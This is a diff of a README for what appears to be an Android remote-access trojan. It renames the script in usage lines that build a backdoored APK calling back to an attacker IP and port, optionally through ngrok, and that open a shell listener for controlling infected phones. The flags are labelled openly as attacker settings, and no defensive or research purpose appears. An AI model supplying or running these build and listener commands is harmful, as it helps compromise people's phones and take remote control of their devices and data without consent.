@@ -62,7 +62,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python3 androvw.py --build --ngrok [flags]
+  python3 androcli.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "test.apk")
@@ -71,7 +71,7 @@ Usage:
 
 ```
 Usage:
-  python3 androvw.py --build [flags]
+  python3 androcli.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -83,7 +83,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python3 androvw.py --shell [flags]
+  python3 androcli.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
@@ -120,13 +120,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 androvw.py --build --ngrok -o try.apk```
+```python3 androcli.py --build --ngrok -o try.apk```
 
 * To build the apk using desired ip and port:
-```python3 androvw.py --build -i 192.169.x.x -p 8000 -o try.apk```
+```python3 androcli.py --build -i 192.169.x.x -p 8000 -o try.apk```
 
 * To get the interpreter:
-```python3 androvw.py --shell -i 0.0.0.0 -p 8000```
+```python3 androcli.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
